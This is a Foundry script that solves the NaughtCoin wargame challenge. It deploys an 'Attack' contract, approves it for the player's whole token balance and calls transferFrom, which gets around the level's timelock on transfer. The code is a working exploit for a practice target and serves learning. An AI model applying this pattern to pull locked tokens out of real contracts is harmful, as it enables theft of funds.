// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinSolve is Script{
    NaughtCoin public naughtCoin = NaughtCoin(0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address player = address(naughtCoin.player());
        uint playerBalance = naughtCoin.balanceOf(player);
        console.log("Player : ", player);
        console.log("Player Balance : ", playerBalance);
        
        Attack attack = new Attack();
        console.log("Attack Address : ", address(attack));
        
        naughtCoin.approve(address(attack), playerBalance);

        attack.exploit(player);

        console.log("Player : ", player);
        console.log("Player Balance : ", naughtCoin.balanceOf(player));
        console.log("Attacker Balance : ", naughtCoin.balanceOf(address(attack)));

        vm.stopBroadcast();
    }
}

contract Attack{
    NaughtCoin public naughtCoin = NaughtCoin(0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497);

    function exploit(address _player) public {
        
        require(naughtCoin.allowance(_player, address(this)) > 0, "Not approved yet");

        require(naughtCoin.transferFrom(_player, address(this), naughtCoin.balanceOf(_player)), "Transfer to Atacker Failed");
    }
}